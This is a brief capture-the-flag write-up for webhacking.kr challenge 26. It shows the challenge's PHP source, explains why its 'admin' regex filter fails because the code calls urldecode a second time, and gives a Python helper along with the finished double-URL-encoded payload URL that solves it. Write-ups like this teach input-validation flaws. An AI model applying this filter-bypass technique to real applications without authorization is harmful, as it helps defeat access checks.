# Old 26    PHP (2x URLEncode)

URL: [https://webhacking.kr/challenge/web-11/?view_source=1](https://webhacking.kr/challenge/web-11/?view_source=1)

```php
<?php
  if(preg_match("/admin/",$_GET['id'])) { echo"no!"; exit(); }
  $_GET['id'] = urldecode($_GET['id']);
  if($_GET['id'] == "admin"){
    solve(26);
  }
?>
```

The php does url decoding once by itself, but in code we notice it does manually. This means that if we pass double urlencoded string to `id` then first php will decode once, then code will decode second time and we will be able to slip in `admin` value.

```python
>>> from urllib.parse import quote
>>> def double_urlencode(string):
...     output = ''.join(f'%{ord(char):02X}' for char in string)
...     output = quote(output, safe='')
...     return output
...
>>> double_urlencode('admin')
'%2561%2564%256D%2569%256E'

# https://webhacking.kr/challenge/web-11/?id=%2561%2564%256D%2569%256E
```